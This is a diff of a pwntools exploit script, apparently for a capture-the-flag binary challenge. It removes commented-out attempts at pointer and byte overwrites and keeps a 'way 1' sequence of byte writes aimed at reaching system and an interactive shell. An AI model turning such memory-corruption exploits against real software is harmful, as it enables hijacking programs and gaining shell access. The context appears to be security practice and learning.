@@ -51,39 +51,6 @@ def do_set(idx, value):
     slna(b'  From (0-255): ', idx)
     slna(b'  To   (0-255): ', value)
 GDB()
-# overwrite ptr    
-# slna(b'>> ', 3)
-# sla(b'Text: ', p16(0x01ff))
-
-# 04012E9   
-
-# do_set(255-7, 0x6e)
-# do_set(255-6, 0x18)
-
-
-# sla(b'>> ', b'1\0' + b'a'*10)
-# sla(b'  From (0-255): ', b'152\0'.ljust(0x20-1,b'a'))
-# sla(b'  To   (0-255): ', b'118\0'.ljust(0x20-1,b'b'))
-
-# do_set(152, 0x76)
-
-
-# do_set(152, 0xf3)
-# input("send looop")
-# num = 160
-# system = 0x04012E9 
-
-
-
-# do_set(240, 0xf0)
-
-# slna(b'>> ', 3)
-
-# sla(b'Text: ', p16(0x0201))
-
-# # # overwrite 0 to be main
-# # # 36 push
-# # # 3a : sub rsp
 #######################################
 ##### way 1 ##########
 do_set(1, 0x73)
@@ -99,23 +66,5 @@ print(hex(exe.plt.system))
 #######################################
 
 ######################################
-###### way 2 #################
-# do_set()
-
-# 401836
-# slna(b'>> ', 0)
-# sleep(1)
-
-# sla(b'Name: ', b'/bin/sh')
-
-
-# # input("check")
-
-# do_set(240, 0xe9)
-
-
-
-
-
 
 p.interactive()
